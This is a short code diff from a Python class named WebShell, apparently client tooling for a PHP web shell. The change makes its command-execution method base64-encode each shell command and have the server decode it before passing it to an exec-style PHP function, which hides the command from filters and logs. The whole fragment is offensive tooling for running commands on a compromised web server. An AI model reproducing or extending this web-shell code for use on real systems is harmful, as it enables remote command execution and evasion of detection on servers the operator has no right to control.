@@ -302,7 +302,7 @@ class WebShell():
         pass
 
     def php_command_exec(self,function, command):
-        code = "%s('%s 2>&1');" % (function, command)
+        code = "%s(base64_decode('%s'));" % (function, ("%s 2>&1" % command).encode("base64").replace("\n", ""))
         return self.php_code_exec_token(code);
     '''
         try:
